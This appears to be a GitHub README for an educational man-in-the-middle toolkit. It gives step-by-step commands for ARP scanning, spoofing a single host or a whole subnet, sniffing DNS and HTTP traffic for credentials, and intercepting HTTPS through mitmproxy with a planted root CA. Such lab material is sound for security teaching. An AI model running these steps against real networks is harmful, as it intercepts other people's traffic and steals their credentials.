# Man-In-The-Middle

<p align="center">
<img width="556" height="260" alt="MITM Diagram" src="https://github.com/user-attachments/assets/6c25a14a-fcc7-4027-b5c6-a5e89f3d00f0" />
</p>

<h1 align="center">Man-In-The-Middle</h1>

<p align="center">
  <b>Controlled simulation of ARP spoofing, DNS sniffing, and HTTP/HTTPS interception for educational environments.</b>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/python-3.8+-blue?logo=python&logoColor=white" />
  <img src="https://img.shields.io/badge/platform-Linux-orange?logo=linux&logoColor=white" />
  <img src="https://img.shields.io/badge/license-MIT-green" />
  <a href="README-Español.md"><img src="https://img.shields.io/badge/idioma-Español-red" /></a>
</p>

---

## Table of Contents

- [Overview](#overview)
- [Requirements](#requirements)
- [Installation](#installation)
- [Phase 1 — Host Discovery (arpScan.py)](#phase-1--host-discovery-arpscanpy)
- [Phase 2 — ARP Spoofing](#phase-2--arp-spoofing)
- [Phase 3 — DNS Traffic Capture (dns_sniffer.py)](#phase-3--dns-traffic-capture-dns_snifferpy)
- [Phase 4 — HTTP Traffic Capture (http_sniffer.py)](#phase-4--http-traffic-capture-http_snifferpy)
- [Phase 5 — HTTPS Interception (mitmproxy)](#phase-5--https-interception-mitmproxy)
- [Disclaimer](#-disclaimer)
- [Author](#author)
- [License](#license)

---

## Overview

A Man-in-the-Middle (MITM) attack occurs when a third party intercepts, inspects, or modifies the communication between two parties without their knowledge. This enables credential theft, exposure of sensitive data, or manipulation of messages in transit.

This repository provides a set of tools for **controlled simulation** of the full MITM attack chain in a lab environment:

| Tool | Purpose |
|------|---------|
| `arpScan.py` | ARP-based host discovery on the local network |
| `AllNetwork_Spoof.sh` | Network-wide ARP spoofing launcher |
| `dns_sniffer.py` | Real-time DNS query monitoring |
| `http_sniffer.py` | HTTP request capture and credential detection |

---

## Requirements

**Operating System:** Linux (Kali, Debian, Ubuntu, or derivatives)

**System packages:**

```bash
sudo apt update
sudo apt install -y python3 python3-scapy python3-pip dsniff arp-scan
```

**Python dependencies:**

```bash
pip3 install scapy termcolor
```

**Permissions:** All scripts require **root** (`sudo`) to access raw sockets and network interfaces.

---

## Installation

```bash
git clone https://github.com/xrl3y/Man-In-The-Middle.git
cd Man-In-The-Middle
chmod +x AllNetwork_Spoof.sh
```

---

## Phase 1 — Host Discovery (arpScan.py)

Before performing any attack, we need to identify live hosts on the network. This script sends ARP requests and displays the responding devices in a formatted table.

### Usage

```bash
# Scan a full subnet
sudo python3 arpScan.py -t 192.168.1.0/24

# Scan a single host
sudo python3 arpScan.py -t 192.168.1.10

# Specify interface and timeout
sudo python3 arpScan.py -t 192.168.1.0/24 -i eth0 --timeout 3

# Export results to CSV or JSON
sudo python3 arpScan.py -t 192.168.1.0/24 -o results.csv
sudo python3 arpScan.py -t 192.168.1.0/24 -o results.json
```

### Options

| Flag | Description | Default |
|------|-------------|---------|
| `-t, --target` | Target IP or CIDR range | *(required)* |
| `-i, --interface` | Network interface | auto-detect |
| `--timeout` | ARP response timeout (seconds) | `2` |
| `-o, --output` | Export to `.csv` or `.json` | — |
| `-v, --verbose` | Show additional details | off |

### Example Output

<p align="center">
<img alt="ARP Scan output" src="https://github.com/user-attachments/assets/f7d868f7-5201-4976-8b49-fe9156fd8071" />
</p>

**Alternative:** You can also use the system-level `arp-scan` tool:

```bash
sudo arp-scan -I <Interface> --localnet
```

---

## Phase 2 — ARP Spoofing

ARP spoofing (ARP poisoning) sends false ARP replies to associate the attacker's MAC address with another host's IP (typically the gateway), redirecting traffic through the attacker's machine.

### Prerequisites — Enable Forwarding

Before spoofing, you must allow traffic forwarding so the victim maintains connectivity:

```bash
# Allow forwarding in iptables
sudo iptables -P FORWARD ACCEPT

# Enable IP forwarding (choose one)
sudo sysctl -w net.ipv4.ip_forward=1
# or
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Verify
cat /proc/sys/net/ipv4/ip_forward
# Should output: 1
```

### Single Target — arpspoof

```bash
sudo arpspoof -i <Interface> -t <VictimIP> -r <RouterIP>
```

<p align="center">
<img alt="ARP Spoof running" src="https://github.com/user-attachments/assets/c6bee950-29e9-4e93-a36c-9c38d84156c3" />
</p>

> Leave this running in its own terminal while you use the sniffers.

### Full Network — AllNetwork_Spoof.sh

To spoof the entire subnet simultaneously:

```bash
# Default: 192.168.1.1-254 on ens33
sudo bash AllNetwork_Spoof.sh

# Custom configuration
sudo bash AllNetwork_Spoof.sh -i eth0 -s 10.0.0 -g 10.0.0.1 --start 2 --end 100

# Limit concurrent processes
sudo bash AllNetwork_Spoof.sh -j 30
```

### AllNetwork_Spoof.sh Options

| Flag | Description | Default |
|------|-------------|---------|
| `-i, --interface` | Network interface | `ens33` |
| `-s, --subnet` | Subnet base (first 3 octets) | `192.168.1` |
| `-g, --gateway` | Gateway IP | `${SUBNET}.1` |
| `--start` | First host number | `1` |
| `--end` | Last host number | `254` |
| `-j, --jobs` | Max concurrent arpspoof processes | `50` |

The script includes:
- Automatic IP forwarding setup
- Gateway auto-skip (won't spoof the gateway against itself)
- Interface validation with suggestions
- Clean shutdown on `Ctrl+C` (kills all child processes)
- Progress indicator during launch

---

## Phase 3 — DNS Traffic Capture (dns_sniffer.py)

With the spoofer running, this script captures DNS queries passing through your interface, showing which domains the victim is resolving in real time.

### Usage

```bash
# Default interface
sudo python3 dns_sniffer.py

# Specify interface
sudo python3 dns_sniffer.py -i eth0

# Log to file
sudo python3 dns_sniffer.py -i eth0 --log dns_capture.log

# Show all queries (disable built-in filter)
sudo python3 dns_sniffer.py --no-filter

# Add custom exclusions
sudo python3 dns_sniffer.py --exclude amazon netflix spotify
```

### Options

| Flag | Description | Default |
|------|-------------|---------|
| `-i, --interface` | Network interface | auto-detect |
| `--log` | Save output to log file | — |
| `--no-filter` | Disable keyword filtering | off |
| `--exclude` | Additional keywords to filter out | — |

### Features

- **First-seen highlighting:** New domains appear in yellow with `[NEW]` tag; repeated queries show the count
- **Record type display:** Shows A, AAAA, CNAME, MX, etc.
- **Source IP tracking:** Shows which host made the query
- **Built-in noise filter:** Excludes common CDN/telemetry domains (Google, Microsoft, Apple, etc.)
- **Summary on exit:** `Ctrl+C` shows total queries, unique domains, and top 5 most queried

### Example Output

<p align="center">
<img alt="DNS Sniffer output" src="https://github.com/user-attachments/assets/7fc9cc5c-3801-46cc-b818-306ee66cb08a" />
</p>

---

## Phase 4 — HTTP Traffic Capture (http_sniffer.py)

Captures unencrypted HTTP requests and analyzes POST bodies for potential credentials. Only works on HTTP (port 80) — for HTTPS interception, see Phase 5.

### Usage

```bash
# Default interface
sudo python3 http_sniffer.py

# Specify interface
sudo python3 http_sniffer.py -i eth0

# Log to file
sudo python3 http_sniffer.py --log http_capture.log
```

### Options

| Flag | Description | Default |
|------|-------------|---------|
| `-i, --interface` | Network interface | auto-detect |
| `--log` | Save output to log file | — |

### Features

- **Method coloring:** GET (blue), POST (green), PUT (yellow), DELETE (red)
- **Credential detection:** Scans POST bodies for 30+ keywords (username, password, token, api_key, ssn, etc.)
- **URL-decoded output:** POST data is decoded and displayed as readable `key = value` pairs
- **Visual alerts:** Credential matches trigger a highlighted warning block
- **Summary on exit:** Shows total requests captured and credential detections

### Example Output

<p align="center">
<img alt="HTTP Sniffer output" src="https://github.com/user-attachments/assets/8340bcc4-6c2f-49f6-8f31-e70582ec4552" />
</p>

---

## Phase 5 — HTTPS Interception (mitmproxy)

To intercept encrypted HTTPS traffic, a proxy with certificate injection is required. We use **mitmproxy** for this.

### Step 1 — Install mitmproxy

Download the Linux binary from [mitmproxy.org](https://mitmproxy.org) and extract:

```bash
tar -xf mitmproxy-*-linux-x86_64.tar.gz
```

<p align="center">
<img alt="mitmproxy download" src="https://github.com/user-attachments/assets/cd98fcb3-e74b-483f-ac43-452e5e75df14" />
</p>

### Step 2 — Start the proxy

```bash
./mitmweb
```

This opens port **8080** on the attacker's machine and launches a web UI for inspecting traffic.

<p align="center">
<img alt="mitmweb running" src="https://github.com/user-attachments/assets/bec9fb3b-0201-462e-b6cd-ed2ace3aa4b7" />
</p>

### Step 3 — Configure the victim's proxy

On the victim machine, set the HTTP/HTTPS proxy to point to the attacker's IP on port 8080:

<p align="center">
<img alt="Proxy settings" src="https://github.com/user-attachments/assets/d7479689-8276-4300-8069-e2e950c9e88d" />
</p>

### Step 4 — Install the CA certificate

On the victim machine, navigate to [http://mitm.it](http://mitm.it) and download the certificate for the appropriate OS. Install it as a trusted root CA.

<p align="center">
<img alt="mitm.it certificate page" src="https://github.com/user-attachments/assets/6a0dd808-2af2-4bd6-90da-8033c3ba23bf" />
</p>

> When installing, select **"Place all certificates in the following store"** → **Trusted Root Certification Authorities**.

<p align="center">
<img alt="Certificate store" src="https://github.com/user-attachments/assets/cbb2a46c-7082-450d-a701-8dff036048f6" />
</p>

### Step 5 — Capture HTTPS traffic

Return to the attacker machine and run:

```bash
./mitmproxy
```

All HTTPS traffic from the victim will now be visible in cleartext, including URLs, headers, request bodies, and credentials.

---

## 🛑 Disclaimer

> **⚠️ This content is for educational purposes only.**
>
> This repository and its contents are provided exclusively for educational, research, and learning purposes in **controlled and authorized environments**.
>
> - **Do not** use this material to perform illegal, unauthorized, or harmful activities against networks, systems, or people.
> - If you plan to practice on a network or device you do not own, **obtain explicit written permission** from the owner before proceeding.
> - The author accepts **no responsibility** for any damage, loss, misuse, unauthorized access, legal consequences, or incidents resulting from the use of this content.
>
> **Recommendations:**
> - Use isolated lab environments (virtual machines, test networks) for experimentation.
> - Respect applicable laws and your organization's policies.
> - If you have legal or ethical doubts, consult a qualified professional.

---

## Author

Developed by **Eliot Code**.

<p align="center">
<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif" />
</p>

## License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.
